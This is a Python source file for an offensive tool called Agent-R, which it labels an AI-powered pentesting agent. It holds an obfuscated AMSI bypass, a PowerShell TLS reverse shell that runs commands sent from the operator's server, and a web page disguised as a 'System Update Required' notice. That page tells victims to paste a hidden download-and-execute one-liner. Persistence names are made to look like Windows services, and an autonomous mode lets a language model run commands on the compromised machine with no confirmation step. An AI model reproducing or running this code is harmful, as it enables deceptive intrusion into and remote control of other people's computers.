#!/usr/bin/env python3
"""
Agent-R: AI-Powered Pentesting Agent
Modularized and Improved Version
"""

import os
import sys
import socket
import threading
import subprocess
import time
import ssl
import tempfile
import random
import string
import json
import requests
import argparse
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

# Import our modules
import ai_handler
import c2_listener

console = Console()

# Setup logging
logging.basicConfig(
    filename='agent-r.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def clear_screen():
    """Cross-platform screen clear."""
    console.clear()

# Check for optional cryptography library
CRYPTO_AVAILABLE = False
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    pass

class Config:
    def __init__(self):
        self.public_ip = None
        self.listener_port = 4444
        self.http_port = 8080
        self.handshake_secret = os.getenv("AGENT_R_SECRET", "agent-r-default-secret")
        self.cmd_delimiter = "---" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + "---"
        self.cmd_timeout = 60
        self.cert_file = None
        self.key_file = None
        self.custom_domain = None
        self.ai_model = "deepseek-coder:6.7b"
        
        svc_names = ["WinDefend", "WinUpdate", "MsEdge", "OneDrive", "Teams", "Outlook", "Cortana", "AdobeGC"]
        self.persist_task_name = random.choice(svc_names) + ''.join(random.choices(string.digits, k=3))
        self.persist_file_name = random.choice(["svc", "upd", "cfg", "sync"]) + ''.join(random.choices(string.ascii_lowercase, k=4)) + ".ps1"

    def get_ip(self):
        if self.custom_domain:
            return self.custom_domain
        if not self.public_ip:
            try:
                result = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True, timeout=5)
                self.public_ip = result.stdout.strip()
            except Exception:
                self.public_ip = "127.0.0.1"
        return self.public_ip

CFG = Config()
SHELL = c2_listener.ShellManager(CFG)

# ============================================================================
# EVASION HELPERS
# ============================================================================

def get_amsi_bypass():
    bypass_core = '''
$w = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$f = $w.GetField((''+[char]97+'msiInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)
'''
    key = random.randint(1, 254)
    encoded = ','.join(str(ord(c) ^ key) for c in bypass_core.strip())
    return f'$k={key};$e=@({encoded});$d=-join($e|%{{[char]($_-bxor$k)}});iex $d'

def get_tls_payload(ip, port, secret):
    amsi = get_amsi_bypass()
    return f'''{amsi};while(1){{try{{
$h="{ip}";$p={port};$secret="{secret}";
$t=New-Object Net.Sockets.TcpClient($h,$p);
$ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
$ssl.AuthenticateAsClient($h);
$w=New-Object IO.StreamWriter($ssl);$r=New-Object IO.StreamReader($ssl);
$w.AutoFlush=$true;
$ch=$r.ReadLine();
if($ch.StartsWith("CHALLENGE:")){{
$chal=$ch.Split(":")[1];
$hmac=New-Object Security.Cryptography.HMACSHA256;
$hmac.Key=[Text.Encoding]::UTF8.GetBytes($secret);
$hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
$resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join "";
$w.WriteLine($resp);
}}
while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2>&1|Out-String;$w.WriteLine($o)}}
}}catch{{}};Sleep 5}}'''

# ============================================================================
# HTTP SERVER (For Staging & Exfil)
# ============================================================================

class ClickFixHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/s':
            ip = CFG.get_ip()
            port = CFG.listener_port
            secret = CFG.handshake_secret
            payload = get_tls_payload(ip, port, secret)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(payload.encode())
        elif self.path == '/':
            ip = CFG.get_ip()
            one_liner = f"powershell -w hidden -c \"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content\""
            html = f"<html><body><h1>System Update Required</h1><p>Run this command: <code>{one_liner}</code></body></html>"
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()

def start_http_server():
    server = ThreadingHTTPServer(('0.0.0.0', CFG.http_port), ClickFixHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

# ============================================================================
# MENUS
# ============================================================================

def show_menu(title, options):
    table = Table(show_header=False, box=None)
    table.add_column("Opt", style="bold yellow")
    table.add_column("Desc", style="white")
    for opt, desc in options:
        table.add_row(f"[{opt}]", desc)
    console.print(Panel(table, title=f"[bold cyan]{title}[/]", border_style="cyan"))
    valid = [str(o[0]) for o in options]
    return Prompt.ask("Choose", choices=valid, default="0")

def autonomous_mode():
    console.print(Panel(f"[bold cyan]AI AUTONOMOUS MODE[/]\nModel: {CFG.ai_model}\nPress Ctrl+C to stop.", border_style="cyan"))
    state = ai_handler.AgentState()
    max_iterations = 30
    try:
        while state.iteration < max_iterations:
            state.iteration += 1
            last_output = state.command_history[-1]["output"] if state.command_history else ""
            console.print(f"\n[dim]Thinking... (iteration {state.iteration}/{max_iterations})[/]")
            prompt = ai_handler.build_ai_prompt(state, last_output)
            ai_response = ai_handler.ask_ai(prompt, CFG.ai_model)
            command = ai_response.strip().split("\n")[0]
            if not command or command.startswith("[AI ERROR"):
                console.print(f"[red]{ai_response}[/]")
                time.sleep(5)
                continue
            console.print(f"[bold yellow]AI Command:[/] {command}")
            console.print("[dim]Executing...[/]")
            logging.info(f"AI executing: {command}")
            result = SHELL.execute(command)
            logging.info(f"AI result: {result[:100]}...")
            state.command_history.append({"cmd": command, "output": result})
            ai_handler.detect_edr_from_output(result, state)
            if "whoami" in command.lower() and result: state.username = result.strip()
            if "hostname" in command.lower() and result: state.hostname = result.strip()
            if "SeDebugPrivilege" in result: state.is_admin = True
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[yellow]Autonomous mode stopped.[/]")

def ai_assistant_mode():
    console.print(Panel(f"[bold magenta]AI ASSISTANT MODE[/]\nModel: {CFG.ai_model}\nType 'exit' to return.", border_style="magenta"))
    state = ai_handler.AgentState()
    while True:
        try:
            user_input = Prompt.ask("\n[bold magenta]What should I do?[/]")
            if user_input.lower() == 'exit': break
            prompt = f"You are a pentesting assistant with shell access to a Windows victim. User wants: {user_input}\nState: {json.dumps(state.to_dict())}\nRespond with ONLY ONE PowerShell command."
            ai_command = ai_handler.ask_ai_streaming(prompt, CFG.ai_model)
            if not ai_command or ai_command.startswith("[AI ERROR"): continue
            if Prompt.ask(f"\nExecute this command?", choices=["y", "n"], default="y") == "y":
                result = SHELL.execute(ai_command)
                console.print(Panel(result, title="Output"))
                ai_handler.detect_edr_from_output(result, state)
        except KeyboardInterrupt: break

def main():
    parser = argparse.ArgumentParser(description='Agent-R: AI-Powered Pentesting Agent')
    parser.add_argument('--port', type=int, default=4444, help='Listener port')
    parser.add_argument('--http-port', type=int, default=8080, help='HTTP server port')
    parser.add_argument('--model', default='deepseek-coder:6.7b', help='Ollama model name')
    args = parser.parse_args()

    CFG.listener_port = args.port
    CFG.http_port = args.http_port
    CFG.ai_model = args.model

    clear_screen()
    console.print(Panel("[bold green]Agent-R: AI-Powered Pentesting Agent[/]\nStarting services...", border_style="green"))
    
    SHELL.start_listener(CFG.listener_port)
    start_http_server()
    
    ip = CFG.get_ip()
    one_liner = f"powershell -w hidden -c \"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content\""
    
    console.print(Panel(f"Target Command:\n[bold yellow]{one_liner}[/]\n\nWaiting for connection...", title="Phase 1: Staging"))
    
    if SHELL.wait_for_connection():
        logging.info(f"New connection from {SHELL.addr[0]}")
        while True:
            clear_screen()
            status = "[bold green]Connected[/]" if SHELL.connected else "[bold red]Disconnected[/]"
            console.print(Panel(f"Status: {status}\nTarget: {SHELL.addr[0] if SHELL.addr else 'N/A'}", title="Active Session"))
            
            choice = show_menu("Main Menu", [
                ("1", "Raw Shell"),
                ("2", "AI Autonomous Mode"),
                ("3", "AI Assistant"),
                ("4", "Wait for Reconnect"),
                ("0", "Exit")
            ])
            
            if choice == "0": break
            elif choice == "1":
                while True:
                    cmd = input("PS> ")
                    if cmd.lower() == 'exit': break
                    print(SHELL.execute(cmd))
            elif choice == "2": autonomous_mode()
            elif choice == "3": ai_assistant_mode()
            elif choice == "4": SHELL.wait_for_new_shell()
    
    console.print("[yellow]Shutting down...[/]")
    SHELL.close()

if __name__ == "__main__":
    main()
